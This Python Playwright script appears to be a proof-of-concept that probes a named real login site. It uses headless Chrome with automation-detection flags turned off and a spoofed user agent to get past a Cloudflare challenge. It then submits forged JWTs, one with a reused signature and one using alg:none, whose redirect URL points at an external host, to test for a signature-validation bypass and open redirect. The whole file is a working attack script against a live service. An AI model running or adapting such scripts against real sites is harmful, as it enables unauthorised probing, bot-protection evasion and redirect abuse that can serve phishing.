#!/usr/bin/env python3
"""Persistent-context test: warm up to get cf_clearance, then test returnToToken sig validation.
Compares server response for valid vs bad-signature vs alg:none tokens on /acesso."""
import base64, json, time
from playwright.sync_api import sync_playwright

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def mkjwt(header,payload,sig=""):
    h=b64u(json.dumps(header,separators=(",",":")).encode())
    p=b64u(json.dumps(payload,separators=(",",":")).encode())
    return f"{h}.{p}.{sig}"

EXT="https://example.com/OLXPOC"
orig=open("returnToToken.jwt").read().strip()
osig=orig.split(".")[2]
now=int(time.time()*1000)
tests={
 "valid_baseline":orig,
 "badsig_ext":mkjwt({"alg":"HS256","typ":"JWT"},{"url":EXT,"iat":now},osig),
 "algnone_ext":mkjwt({"alg":"none","typ":"JWT"},{"url":EXT,"iat":now},""),
}

with sync_playwright() as p:
    ctx=p.chromium.launch_persistent_context(
        user_data_dir="/tmp/olx_prof", channel="chrome", headless=True,
        locale="pt-BR",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR","--disable-blink-features=AutomationControlled"])
    pg=ctx.pages[0] if ctx.pages else ctx.new_page()
    # warmup: pass CF managed challenge
    print("[warmup] loading conta root ...")
    try:
        pg.goto("https://conta.olx.com.br/",wait_until="domcontentloaded",timeout=40000)
        for _ in range(6):
            if "Attention Required" not in pg.title(): break
            time.sleep(3);
        print("  warmup title:", pg.title()[:50], "url:", pg.url[:70])
        cf = [c for c in ctx.cookies() if c["name"]=="cf_clearance"]
        print("  cf_clearance:", "YES" if cf else "NO")
    except Exception as e:
        print("  warmup err:", repr(e)[:100])
    time.sleep(2)
    for name,tok in tests.items():
        try:
            r=pg.goto(f"https://conta.olx.com.br/acesso?returnToToken={tok}",
                      wait_until="domcontentloaded",timeout=30000)
            c=pg.content().lower()
            print(f"[{name}] status={r.status if r else '?'} land={pg.url[:75]} title='{pg.title()[:40]}' ext={'example.com' in pg.url}")
        except Exception as e:
            print(f"[{name}] ERR {repr(e)[:80]}")
        time.sleep(2)
    ctx.close()
